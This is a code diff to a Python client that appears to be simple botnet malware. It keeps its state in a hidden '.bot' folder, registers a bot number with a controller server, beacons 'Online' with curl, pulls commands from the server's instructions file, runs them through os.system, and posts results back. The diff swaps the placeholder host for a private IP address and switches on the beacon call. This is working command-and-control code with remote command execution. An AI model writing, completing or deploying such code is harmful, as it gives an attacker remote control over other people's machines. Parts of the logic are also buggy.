@@ -26,29 +26,31 @@ def directoryhandler():
 	else:
 		os.chdir(dir)
 def namecheck():
-	botnames = requests.get('http://<IP>:8080/botnames.txt')
+	botnames = requests.get('http://10.0.2.15:8080/botnames.txt')
 	data = botnames.text.strip().split()
 	lastbot = data[-1]
 	with open('name.txt', 'r+') as f:
 		if f not in data:
 			myname = str(int(lastbot)+1)
 			f.write(myname)
-			request = 'curl -d '+myname+' http://<IP>:8080/log.txt'
+			request = 'curl -d '+myname+' http://10.0.2.15:8080/log.txt'
 			os.system(request)
 		else:
 			close()
 def beacon():
+	dir = os.path.join('./','.bot')
+	os.chdir(dir)
 	myname = open('name.txt', 'r')
 	x = datetime.now()
 	current_time = x.strftime("%H:%M:%S")
 	data = current_time+' Online '+myname.read()
-	request = 'curl -d "'+data+'" http://<IP>:8080/log.txt'
-	starttime = time.time()
+	request = 'curl -d "'+data+'" http://10.0.2.15:8080/log.txt'
+	os.system(request)
 
 def instructions():
 	dir = os.path.join('./','.bot')
 	os.chdir(dir)
-	os.system('curl <IP>:8080/instructions.txt > response.txt')
+	os.system('curl 10.0.2.15:8080/instructions.txt > response.txt')
 	os.system('cat name.txt > sendthis.txt')
 	with open('response.txt') as input_file:
 		myname = open('name.txt', 'r').read()
@@ -58,7 +60,7 @@ def instructions():
 			if bot == myname or bot == 'any':
 				command += line.split("'")[1]
 		os.system(command)
-		os.system('curl -d @./sendthis.txt <IP>/instructions.txt')
+		os.system('curl -d @./sendthis.txt 10.0.2.15:8080/instructions.txt')
 		os.system('rm sendthis.txt response.txt')
 
 
